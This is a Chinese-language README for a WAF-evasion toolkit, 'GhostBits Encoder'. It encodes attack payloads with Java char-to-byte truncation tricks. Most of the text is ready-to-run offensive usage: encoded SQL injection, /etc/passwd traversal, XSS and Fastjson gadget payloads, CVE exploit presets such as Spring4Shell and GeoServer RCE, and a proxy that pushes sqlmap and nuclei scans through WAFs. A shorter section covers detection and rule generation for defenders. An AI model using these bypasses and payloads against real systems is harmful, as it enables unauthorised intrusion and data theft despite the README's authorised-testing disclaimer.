# GhostBits Encoder

**基于 Black Hat Asia 2026 Ghost Bits 技术的 WAF 绕过工具集**

Ghost Bits 利用 Java 中 `char`(16-bit) 强制转换为 `byte`(8-bit) 时高 8 位被截断的特性，构造出能穿透 WAF/IPS 签名检测的攻击载荷。安全设备看到的是无害 Unicode 字符，Java 后端截断高位后还原出完整攻击 payload。

理论来源：[Black Hat Asia 2026 - Cast Attack: Ghost Bits](https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf)

复现环境：[vulhub/spring/CVE-2025-41242](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2025-41242)

## 演示截图

### Payload 编码
![Encode Demo](images/demo-encode.png)

### 漏洞预设
![Preset Demo](images/demo-preset.png)

### Ghost Bits 检测
![Detection Demo](images/demo-detect.png)

### 预设列表
![Presets List](images/demo-presets-list.png)

---

## 快速开始

零依赖，Python 3.9+ 直接运行：

```bash
git clone https://github.com/EastSword/GhostBitsEncoder.git
cd GhostBitsEncoder

# 编码一条 SQL 注入 payload
python3 ghostbits.py encode -p "1 or 1=1" -c gb2312 -f percent --verify

# 使用漏洞预设
python3 ghostbits.py encode --preset spring-traversal

# 启动代理，配合 nuclei/sqlmap 使用
python3 proxy.py -p 8888
```

---

## 项目结构

```
GhostBitsEncoder/
├── ghostbits.py       # 主 CLI 入口（编码/解码/检测/规则/预设/IOC）
├── engine.py          # 核心编码引擎（5 种字符集策略 + 5 种输出格式）
├── presets.py         # 16 个漏洞利用预设
├── detector.py        # 蓝队检测与解码模块
├── rules.py           # Snort/ModSecurity/YARA/Regex 规则生成
├── proxy.py           # HTTP 代理（扫描器自动编码）
├── integrations.py    # Nuclei 模板转换 & Fuzz 字典生成
└── images/            # 演示截图
```

---

## 核心原理

```
原始 payload:  1 or 1=1
ASCII 值:      0x31 0x20 0x6F 0x72 0x20 0x31 0x3D 0x31

Ghost Bits 编码（高位填充汉字区段）:
               U+5431 U+7D20 U+836F U+6572 U+6320 U+8D31 U+5E3D U+8131
               (叱)   (空)   (药)   (敲)   (挠)   (贱)   (帽)   (脱)

WAF 看到:      叱空药敲挠贱帽脱  → 不匹配任何攻击签名 → 放行 ✓

Java 后端:     (byte)'叱' = 0x31 = '1'
               (byte)'空' = 0x20 = ' '
               (byte)'药' = 0x6F = 'o'
               ...
               还原出:  1 or 1=1  → SQL 注入执行 ✓
```

---

## 使用指南

### 1. Payload 编码（红队）

#### 基础编码

```bash
# 编码 SQL 注入，输出 %uXXXX 格式
python3 ghostbits.py encode -p "' UNION SELECT password FROM users--" -f percent

# 编码路径穿越，保留 / 不编码
python3 ghostbits.py encode -p "../../../etc/passwd" -e "/" -c cjk -f percent

# 编码 XSS，保留 HTML 结构字符
python3 ghostbits.py encode -p "<script>alert(1)</script>" -e "<>()" -c latin -f percent

# 输出 \uXXXX 格式（适合 JSON payload）
python3 ghostbits.py encode -p '{"@type":"com.sun.rowset.JdbcRowSetImpl"}' -e '{}":.' -f unicode

# 使用随机种子（可复现结果）
python3 ghostbits.py encode -p "test" --seed 42

# 验证模式（同时显示解码结果）
python3 ghostbits.py encode -p "DROP TABLE users" --verify
```

#### 使用漏洞预设

预设包含了针对特定漏洞优化的编码参数（字符集、豁免字符、重复次数等）：

```bash
# 查看所有预设
python3 ghostbits.py presets

# 按标签过滤
python3 ghostbits.py presets --tag rce
python3 ghostbits.py presets --tag sqli

# 使用预设
python3 ghostbits.py encode --preset spring-traversal
python3 ghostbits.py encode --preset fastjson-rce
python3 ghostbits.py encode --preset geoserver-rce
python3 ghostbits.py encode --preset smtp-smuggling

# 预设 + 自定义覆盖
python3 ghostbits.py encode --preset sqli-basic -c latin -f unicode
```

**可用预设：**

| 预设 | 目标 | CVE |
|------|------|-----|
| `spring-traversal` | Spring 目录穿越 | CVE-2025-41242 |
| `spring4shell` | Spring4Shell RCE | CVE-2022-22965 |
| `fastjson-rce` | Fastjson 反序列化 | — |
| `geoserver-rce` | GeoServer OGC RCE | CVE-2024-36401 |
| `tomcat-upload` | Tomcat 文件上传绕过 | — |
| `smtp-smuggling` | SMTP 邮件走私 | — |
| `openfire-auth` | Openfire 认证绕过 | CVE-2023-32315 |
| `sqli-basic` | 通用 SQL 注入 | — |
| `sqli-union` | UNION 注入 | — |
| `sqli-time-blind` | 时间盲注 | — |
| `xss-basic` | 反射型 XSS | — |
| `xss-event` | 事件处理器 XSS | — |
| `jetty-path` | Jetty 路径绕过 | — |
| `undertow-path` | Undertow URL 绕过 | — |
| `vertx-path` | Vert.x 路由绕过 | — |
| `bcel-classloader` | BCEL ClassLoader RCE | — |

#### 批量编码 & 管道

```bash
# 批量编码文件（每行一个 payload）
python3 ghostbits.py encode --batch payloads.txt -o encoded.txt

# 管道模式
echo "SELECT * FROM users" | python3 ghostbits.py encode -f unicode
cat sqli_list.txt | python3 ghostbits.py encode -f percent > encoded_list.txt

# 静默模式（只输出结果，不输出提示信息）
python3 ghostbits.py encode --preset spring-traversal -q
```

#### 字符集选择

| 字符集 | 说明 | 适用场景 |
|--------|------|----------|
| `gb2312` | GB2312 一级常用汉字 | 中文环境，流量最隐蔽 |
| `cjk` | CJK 统一汉字全范围 | 通用，覆盖面广 |
| `latin` | 拉丁/希腊/西里尔文 | 英文环境 |
| `random` | 全字符集随机 | 最大变异度 |
| `private` | Unicode 私用区 | 不可见字符，隐蔽传输 |

#### 输出格式

| 格式 | 示例 | 适用场景 |
|------|------|----------|
| `raw` | 原始 Unicode 字符 | 直接发送 |
| `unicode` | `\u5431\u7D20` | JSON body、Java 源码 |
| `percent` | `%u5431%u7D20` | URL 参数、HTTP 请求 |
| `mixed` | 随机混合多种编码 | 增加检测难度 |
| `hex` | `\x54\x31\x7D\x20` | 二进制协议 |

---

### 2. 扫描器集成

#### HTTP 代理模式（推荐）

启动代理后，扫描器的攻击流量自动经过 Ghost Bits 编码再发往目标：

```
nuclei/sqlmap/xray → GhostBits Proxy (localhost:8888) → WAF → Java 后端
                     ↑ 自动编码攻击载荷
```

```bash
# 启动代理（默认 selective 模式，只编码攻击特征）
python3 proxy.py

# 指定端口和字符集
python3 proxy.py -p 9999 -c cjk

# aggressive 模式（对所有参数编码）
python3 proxy.py --mode aggressive

# 详细日志（显示编码前后对比）
python3 proxy.py -v
```

**配合各扫描器使用：**

```bash
# Nuclei
nuclei -proxy http://127.0.0.1:8888 -t nuclei-templates/ -u http://target.com

# Sqlmap
sqlmap -u "http://target.com/api?id=1" --proxy=http://127.0.0.1:8888

# Xray
xray webscan --proxy http://127.0.0.1:8888 --url http://target.com

# Curl（手动测试）
curl -x http://127.0.0.1:8888 "http://target.com/search?q=' or 1=1--"

# Burp Suite: Settings → Network → Connections → Upstream Proxy → 127.0.0.1:8888
```

**代理编码模式：**

| 模式 | 行为 | 适用场景 |
|------|------|----------|
| `selective` | 只编码匹配攻击特征的参数 | 日常扫描，低误报 |
| `aggressive` | 对所有参数值编码 | 需要高覆盖率 |
| `full` | 全部编码含结构字符 | 特殊场景，慎用 |

代理内置 8 类攻击特征识别：SQL 注入、路径穿越、XSS、命令注入、Java 反序列化、SSTI/EL 注入、JNDI/LDAP、XXE。

#### Nuclei 模板转换

将现有 Nuclei 模板中的 payload 字段做 Ghost Bits 编码：

```bash
# 转换单个模板
python3 integrations.py nuclei -i cve-2024-36401.yaml -o encoded.yaml

# 批量转换整个目录
python3 integrations.py nuclei -d nuclei-templates/cves/ -o ghostbits-templates/

# 指定字符集和格式
python3 integrations.py nuclei -d templates/ -o output/ -c latin -f unicode
```

#### Fuzz 字典生成

```bash
# 编码单个字典
python3 integrations.py wordlist -i sqli-payloads.txt -o sqli_ghostbits.txt

# 指定格式
python3 integrations.py wordlist -i xss.txt -o xss_encoded.txt -f unicode -c latin

# 生成 7 种编码变体（覆盖所有字符集×格式组合）
python3 integrations.py wordlist -i payloads.txt --variants -o variants_dir/
# 输出:
#   variants_dir/payloads_gb2312_percent.txt
#   variants_dir/payloads_gb2312_unicode.txt
#   variants_dir/payloads_cjk_percent.txt
#   variants_dir/payloads_latin_percent.txt
#   variants_dir/payloads_latin_unicode.txt
#   variants_dir/payloads_private_percent.txt
#   variants_dir/payloads_random_mixed.txt
```

---

### 3. 检测与防御（蓝队）

#### 检测 Ghost Bits 编码

```bash
# 检测单个字符串
python3 ghostbits.py detect -p "可疑字符串"

# 检测文件内容
python3 ghostbits.py detect -i suspicious_request.txt

# 扫描 access log
python3 ghostbits.py detect --scan /var/log/nginx/access.log

# JSON 格式输出（适合 SIEM 集成）
python3 ghostbits.py detect --scan access.log --json

# 管道模式（可集成到日志处理管道）
tail -f access.log | python3 ghostbits.py detect
```

退出码：`0` = 正常，`1` = 检测到 Ghost Bits，`2` = 文件错误

#### 解码还原

```bash
# 解码 %uXXXX 格式
python3 ghostbits.py decode -p "%u5431%u7D20%u836F%u6572"

# 解码 \uXXXX 格式
python3 ghostbits.py decode -p "\u5431\u7D20\u836F\u6572"

# 从文件解码
python3 ghostbits.py decode -i encoded_payload.txt

# 原始字节输出（不转义控制字符）
python3 ghostbits.py decode -p "%u010d%u010a" --raw

# JSON 详细分析
python3 ghostbits.py decode -p "编码内容" --json
```

#### 生成检测规则

```bash
# 生成所有格式的规则
python3 ghostbits.py rules

# 指定格式
python3 ghostbits.py rules --format snort -o ghost_bits.rules
python3 ghostbits.py rules --format modsecurity -o modsec_ghostbits.conf
python3 ghostbits.py rules --format yara -o ghost_bits.yar
python3 ghostbits.py rules --format regex

# 输出 IOC 检测模式
python3 ghostbits.py ioc
python3 ghostbits.py ioc --json
```

**支持的规则格式：**
- **Snort/Suricata** — IDS/IPS 部署
- **ModSecurity** — WAF 规则（含 Unicode 归一化链式检测）
- **YARA** — 文件/流量扫描
- **Regex** — 通用正则，适配 SIEM/日志分析

---

### 4. 完整命令参考

```bash
# 编码
python3 ghostbits.py encode -p <payload> [-c charset] [-f format] [-e exempt] [-r repeat] [-t tail] [--seed N] [--verify] [-q] [-o file]
python3 ghostbits.py encode --preset <id> [--verify]
python3 ghostbits.py encode --batch <file> [-o output]

# 解码
python3 ghostbits.py decode -p <encoded> [--raw] [--json]
python3 ghostbits.py decode -i <file>

# 检测
python3 ghostbits.py detect -p <text>
python3 ghostbits.py detect -i <file>
python3 ghostbits.py detect --scan <logfile> [--json] [--threshold 0.3]

# 规则
python3 ghostbits.py rules [--format snort|modsecurity|yara|regex|all] [-o file]

# 预设
python3 ghostbits.py presets [--tag <tag>] [--tags] [--json]

# IOC
python3 ghostbits.py ioc [--json]

# 代理
python3 proxy.py [-p port] [-b bind] [-c charset] [--mode selective|aggressive|full] [-v]

# 集成
python3 integrations.py nuclei -i <file> | -d <dir> [-o output] [-c charset] [-f format]
python3 integrations.py wordlist -i <file> [-o output] [-c charset] [-f format] [--variants]
```

---

## 实战场景示例

### 场景 1：绕过 WAF 验证 Spring 目录穿越

```bash
# 生成编码后的穿越 payload
python3 ghostbits.py encode --preset spring-traversal -q
# 输出: %u6F2E%u882E/%u872E%u772E/...../etc/passwd

# 用 curl 直接发送
curl "http://target.com/$(python3 ghostbits.py encode --preset spring-traversal -q)"
```

### 场景 2：Sqlmap 穿透 WAF 扫描

```bash
# 终端 1: 启动代理
python3 proxy.py -p 8888 -v

# 终端 2: sqlmap 通过代理扫描
sqlmap -u "http://target.com/api/user?id=1" \
  --proxy=http://127.0.0.1:8888 \
  --technique=U \
  --dbms=mysql
```

### 场景 3：Nuclei 批量扫描绕过 WAF

```bash
# 方式 A: 代理模式（推荐）
python3 proxy.py -p 8888 --mode aggressive &
nuclei -proxy http://127.0.0.1:8888 -t nuclei-templates/cves/ -l targets.txt

# 方式 B: 模板转换模式
python3 integrations.py nuclei -d nuclei-templates/cves/ -o gb-templates/
nuclei -t gb-templates/ -l targets.txt
```

### 场景 4：蓝队日志分析

```bash
# 扫描 Nginx 日志
python3 ghostbits.py detect --scan /var/log/nginx/access.log

# 实时监控
tail -f /var/log/nginx/access.log | while read line; do
  echo "$line" | python3 ghostbits.py detect 2>/dev/null
  if [ $? -eq 1 ]; then
    echo "[ALERT] Ghost Bits detected: $line"
  fi
done

# 生成防御规则部署到 WAF
python3 ghostbits.py rules --format modsecurity -o /etc/modsecurity/ghostbits.conf
```

---

## 注意事项

- 本工具仅用于**授权安全测试**和防御研究
- 使用前确保已获得目标系统的**书面授权**
- 生成的 payload 应在**隔离环境**中验证
- Ghost Bits 仅对 **Java 后端**有效（依赖 char→byte 截断特性）
- 代理模式下 HTTPS 流量为隧道透传，不做编码（需要目标为 HTTP 或在 WAF 后解密）

---

*东方隐侠安全团队 · 2026-05*
